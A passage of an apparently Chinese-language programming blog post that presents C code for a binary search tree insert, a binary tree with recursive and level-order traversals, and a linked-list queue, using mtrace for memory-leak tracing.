the extreme performance is what you want, The function <em>bstree_insert</em> can be correctly replaced by <em>bstree_insert2</em> as below. This conversion can save the time of memory allocation.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bstree_insert2</span><span class="params">(bstree ** tree, mytype data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"second address: %d"</span>, *tree);</span><br><span class="line">    bstree_node *node = <span class="literal">NULL</span>;</span><br><span class="line">    bstree_node *tmp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tree == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node = (bstree_node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(bstree_node));</span><br><span class="line"><span class="keyword">if</span> (node == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node-&gt;data = data;</span><br><span class="line">node-&gt;lchild = <span class="literal">NULL</span>;</span><br><span class="line">node-&gt;rchild = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*如果二叉树为空，直接挂到根节点*/</span></span><br><span class="line"><span class="keyword">if</span> (bstree_is_empty((*tree)))</span><br><span class="line">&#123;</span><br><span class="line">        (*tree)-&gt;root = node;</span><br><span class="line">(*tree)-&gt;size++;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tmp = (*tree)-&gt;root;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(tmp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">res = (*tree)-&gt;compare(data,tmp-&gt;data);</span><br><span class="line"><span class="keyword">if</span> (res &gt; <span class="number">0</span>) <span class="comment">/*去右孩子查找*/</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (tmp-&gt;rchild == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">tmp-&gt;rchild = node;</span><br><span class="line">(*tree)-&gt;size++;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    tmp = tmp-&gt;rchild;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">/*去左孩子查找*/</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(tmp-&gt;lchild == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">tmp-&gt;lchild = node;</span><br><span class="line">(*tree)-&gt;size++;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">tmp = tmp-&gt;lchild;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Then modify the <em>main()</em> code:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res = bstree_insert2(&amp;tree,data);</span><br></pre></td></tr></table></figure><p>One last instance that we should focus on, there is an implement of a binary tree:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//binarytree.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"list_queue.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">treenode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">treenode</span> *<span class="title">lchild</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">treenode</span> *<span class="title">rchild</span>;</span></span><br><span class="line">&#125;Tnode,Tree;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">binarytree_create</span><span class="params">(Tree **Root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n输入节点数值((当输入为100时，当前节点创建完成))):"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a == <span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line">*Root = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">*Root = (Tnode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Tnode));</span><br><span class="line"><span class="keyword">if</span> (*Root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(*Root)-&gt;data = a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n create %d 的左孩子:"</span>,a);</span><br><span class="line">binarytree_create(&amp;((*Root)-&gt;lchild));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n create %d 的右孩子:"</span>,a);</span><br><span class="line">binarytree_create(&amp;((*Root)-&gt;rchild));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">binarytree_destory</span><span class="params">(Tree *root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">binarytree_destory(root-&gt;lchild);</span><br><span class="line">binarytree_destory(root-&gt;rchild);</span><br><span class="line"><span class="built_in">free</span>(root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*先序遍历:根结点--》左子树---》右子树*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">binarytree_preorder</span><span class="params">(Tree *root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d "</span>,root-&gt;data);</span><br><span class="line">binarytree_preorder(root-&gt;lchild);</span><br><span class="line">binarytree_preorder(root-&gt;rchild);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*中序遍历:左子树--》跟节点---》右子树*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">binarytree_inorder</span><span class="params">(Tree *root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">binarytree_inorder(root-&gt;lchild);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d "</span>,root-&gt;data);</span><br><span class="line">binarytree_inorder(root-&gt;rchild);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*后序遍历:左子树---》右子树-》根节点*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">binarytree_postorder</span><span class="params">(Tree *root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">binarytree_postorder(root-&gt;lchild);</span><br><span class="line">binarytree_postorder(root-&gt;rchild);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d "</span>,root-&gt;data);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">binarytree_levelorder</span><span class="params">(Tree * root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">list_queue *<span class="built_in">queue</span> = <span class="literal">NULL</span>;</span><br><span class="line">Tnode * node = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">queue</span> = list_queue_create();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*根节点先入队*/</span></span><br><span class="line">list_queue_enqueue(<span class="built_in">queue</span>,(<span class="keyword">void</span> *)root);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(!list_queue_is_empty(<span class="built_in">queue</span>))</span><br><span class="line">&#123;</span><br><span class="line">list_queue_dequeue(<span class="built_in">queue</span>,(<span class="keyword">void</span> *)&amp;node);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d "</span>,node-&gt;data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(node-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">list_queue_enqueue(<span class="built_in">queue</span>,(<span class="keyword">void</span> *)node-&gt;lchild);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(node-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">list_queue_enqueue(<span class="built_in">queue</span>,(<span class="keyword">void</span> *)node-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="built_in">queue</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*打印叶子节点*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">binarytree_printfleaf</span><span class="params">(Tree *root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((root-&gt;lchild == <span class="literal">NULL</span>) &amp;&amp; (root-&gt;rchild == <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d "</span>,root-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">binarytree_printfleaf(root-&gt;lchild);</span><br><span class="line">binarytree_printfleaf(root-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*打印叶子的个数*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binarytree_getleafnum</span><span class="params">(Tree*root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((root-&gt;lchild == <span class="literal">NULL</span>) &amp;&amp; (root-&gt;rchild == <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> binarytree_getleafnum(root-&gt;lchild) + binarytree_getleafnum(root-&gt;rchild);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*打印数的高度*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binarytree_gethigh</span><span class="params">(Tree *root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> lhigh = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> rhigh = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">lhigh = binarytree_gethigh(root-&gt;lchild);</span><br><span class="line">rhigh = binarytree_gethigh(root-&gt;rchild);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ((lhigh &gt; rhigh)?(lhigh + <span class="number">1</span>):(rhigh + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Tree *root = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">setenv(<span class="string">"MALLOC_TRACE"</span>,<span class="string">"1.txt"</span>,<span class="number">1</span>);</span><br><span class="line">    mtrace();</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n创建二叉树:"</span>);</span><br><span class="line">binarytree_create(&amp;root);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n先序遍历二叉树:"</span>);</span><br><span class="line">binarytree_preorder(root);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n中序遍历二叉树:"</span>);</span><br><span class="line">binarytree_inorder(root);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n后序遍历二叉树:"</span>);</span><br><span class="line">binarytree_postorder(root);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n层次遍历二叉树:"</span>);</span><br><span class="line">binarytree_levelorder(root);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n打印二叉树叶子节点:"</span>);</span><br><span class="line">binarytree_printfleaf(root);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n打印二叉树叶子节点个数:%d"</span>,binarytree_getleafnum(root));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n打印二叉树高度:%d"</span>,binarytree_gethigh(root));</span><br><span class="line"></span><br><span class="line">binarytree_destory(root);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//list_queue.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LINK_LIST_QUEUE_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LINK_LIST_QUEUE_H</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">list_queue_node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">void</span> *data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">list_queue_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;queue_node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">list_queue</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line">queue_node *head;</span><br><span class="line">queue_node *tail;</span><br><span class="line">&#125;list_queue;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> list_queue_is_empty(queue) ((queue-&gt;num) == 0)</span></span><br><span class="line"><span class="function">list_queue *<span class="title">list_queue_create</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">list_queue_enqueue</span><span class="params">(list_queue *<span class="built_in">queue</span>,<span class="keyword">void</span> *data)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">list_queue_dequeue</span><span class="params">(list_queue *<span class="built_in">queue</span>,<span class="keyword">void</span> **data)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//list_queue.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"./list_queue.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*创建队列头*/</span></span><br><span class="line"><span class="function">list_queue *<span class="title">list_queue_create</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">list_queue * <span class="built_in">queue</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">queue</span> = (list_queue *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(list_queue));</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">queue</span> == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">queue</span>-&gt;num  = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">queue</span>-&gt;head = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">queue</span>-&gt;tail = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">queue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">list_queue_enqueue</span><span class="params">(list_queue *<span class="built_in">queue</span>,<span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">queue_node *ptmp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">queue</span> == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ptmp = (queue_node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(queue_node));</span><br><span class="line"><span class="keyword">if</span> (ptmp == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ptmp-&gt;data = data;</span><br><span class="line">ptmp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">queue</span>-&gt;head == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">queue</span>-&gt;head = ptmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">queue</span>-&gt;tail-&gt;next = ptmp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">queue</span>-&gt;tail = ptmp;</span><br><span class="line"><span class="built_in">queue</span>-&gt;num++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*出队*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">list_queue_dequeue</span><span class="params">(list_queue *<span class="built_in">queue</span>,<span class="keyword">void</span> **data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">queue_node * ptmp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="built_in">queue</span> == <span class="literal">NULL</span>) || (data == <span class="literal">NULL</span>) || list_queue_is_empty(<span class="built_in">queue</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*data = <span class="built_in">queue</span>-&gt;head-&gt;data;</span><br><span class="line">    ptmp = <span class="built_in">queue</span>-&gt;head;</span><br><span class="line"><span class="built_in">queue</span>-&gt;head = <span class="built_in">queue</span>-&gt;head-&gt;next;</span><br><span class="line"><span class="built_in">queue</span>-&gt;num--;</span><br><span class="line"></span><br><span class="line"><span 